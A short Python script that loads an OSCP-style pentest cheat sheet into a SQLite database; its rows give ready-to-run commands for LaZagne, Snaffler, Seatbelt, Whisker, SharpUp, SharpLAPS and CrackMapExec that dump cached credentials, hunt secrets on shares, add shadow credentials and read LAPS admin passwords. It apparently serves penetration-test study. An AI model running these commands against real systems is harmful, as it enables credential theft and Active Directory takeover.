import sqlite3, os

DB_PATH = os.path.expanduser("~/.oscp_commands.db")

entries = [
    ("lazagne","Dump all locally cached credentials (browsers, DB clients, email, FTP, Wi-Fi)","laZagne.exe all -oA -output C:\\Windows\\Temp","passwords","credential-dumping,windows,passwords,lazagne"),
    ("lazagne","Dump credentials from browser applications only","laZagne.exe browsers","passwords","credential-dumping,windows,browsers,lazagne"),
    ("lazagne","Dump credentials from database clients only (SSMS, ODBC, MySQL, PostgreSQL)","laZagne.exe databases","passwords","credential-dumping,windows,databases,lazagne"),
    ("snaffler","Enumerate AD computers, find readable SMB shares, hunt files containing credentials","Snaffler.exe -s -o C:\\Windows\\Temp\\snaffler.log","ad","credential-hunting,active-directory,file-shares,smb,snaffler"),
    ("snaffler","Snaffler with explicit domain and DC specified","Snaffler.exe -s -o C:\\Windows\\Temp\\snaffler.log -d DOMAIN.LOCAL -c DC01.DOMAIN.LOCAL","ad","credential-hunting,active-directory,smb,snaffler"),
    ("snaffler","Scan a specific local drive instead of AD shares","Snaffler.exe -s -i C:\\","misc","credential-hunting,windows,local,file-search,snaffler"),
    ("seatbelt","Run ALL host enumeration checks -- full situational awareness dump","Seatbelt.exe -group=all -full > C:\\Windows\\Temp\\seatbelt.txt","privesc-windows","enumeration,windows,situational-awareness,privesc,ghostpack,seatbelt"),
    ("seatbelt","Run user-focused checks (PowerShell history, saved creds, PuTTY sessions, tokens)","Seatbelt.exe -group=user","privesc-windows","enumeration,windows,user-context,credentials,seatbelt"),
    ("seatbelt","Check Windows autologon registry keys for plaintext credentials","Seatbelt.exe WindowsAutoLogon","privesc-windows","enumeration,windows,credentials,registry,autologon,seatbelt"),
    ("seatbelt","Search PowerShell history files for credential patterns","Seatbelt.exe PowerShellHistory","privesc-windows","enumeration,windows,credentials,powershell,history,seatbelt"),
    ("seatbelt","Dump saved Wi-Fi profiles including cleartext PSK passphrases","Seatbelt.exe WifiProfile","privesc-windows","enumeration,windows,wifi,credentials,seatbelt"),
    ("whisker","Add shadow credentials to target AD user via msDS-KeyCredentialLink -- outputs ready-to-run Rubeus command","Whisker.exe add /target:TARGETUSER /domain:DOMAIN.LOCAL /dc:DC01.DOMAIN.LOCAL","ad","shadow-credentials,active-directory,kerberos,dacl-abuse,ghostpack,whisker"),
    ("whisker","List existing key credentials on a target AD object","Whisker.exe list /target:TARGETUSER /domain:DOMAIN.LOCAL /dc:DC01.DOMAIN.LOCAL","ad","shadow-credentials,active-directory,enumeration,whisker"),
    ("whisker","Remove a specific shadow credential by device ID (cleanup)","Whisker.exe remove /target:TARGETUSER /domain:DOMAIN.LOCAL /dc:DC01.DOMAIN.LOCAL /deviceID:<GUID>","ad","shadow-credentials,active-directory,cleanup,whisker"),
    ("sharpup","Run ALL Windows privesc checks in audit mode (always use audit -- bypasses integrity checks)","SharpUp.exe audit","privesc-windows","privesc,windows,enumeration,ghostpack,powerup,sharpup"),
    ("sharpup","Check for unquoted service paths","SharpUp.exe audit UnquotedServicePath","privesc-windows","privesc,windows,unquoted-service-path,services,sharpup"),
    ("sharpup","Check for modifiable service binaries","SharpUp.exe audit ModifiableServiceBinaries","privesc-windows","privesc,windows,services,weak-permissions,sharpup"),
    ("sharpup","Check for hijackable paths in user PATH (DLL hijacking)","SharpUp.exe audit HijackablePaths","privesc-windows","privesc,windows,dll-hijacking,path-hijacking,sharpup"),
    ("sharplaps","Retrieve LAPS plaintext local Admin password from AD LDAP (requires ReadLAPSPassword on computer object)","SharpLAPS.exe /user:DOMAIN\\USERNAME /pass:PASSWORD /host:<DC_IP>","ad","laps,active-directory,credential-dumping,lateral-movement,ldap,sharplaps"),
    ("sharplaps","Retrieve LAPS password over LDAPS (SSL)","SharpLAPS.exe /user:DOMAIN\\USERNAME /pass:PASSWORD /host:<DC_IP> /ssl","ad","laps,active-directory,credential-dumping,ldaps,sharplaps"),
    ("crackmapexec","Retrieve LAPS passwords remotely from Kali using CME LAPS module","crackmapexec ldap <DC_IP> -u USERNAME -p PASSWORD --module laps","ad","laps,active-directory,credential-dumping,crackmapexec"),
]

conn = sqlite3.connect(DB_PATH)
c = conn.cursor()
for e in entries:
    c.execute("INSERT INTO commands (tool,description,command,category,tags) VALUES (?,?,?,?,?)", e)
conn.commit()
conn.close()
print(f"[+] Inserted {len(entries)} entries into {DB_PATH}")
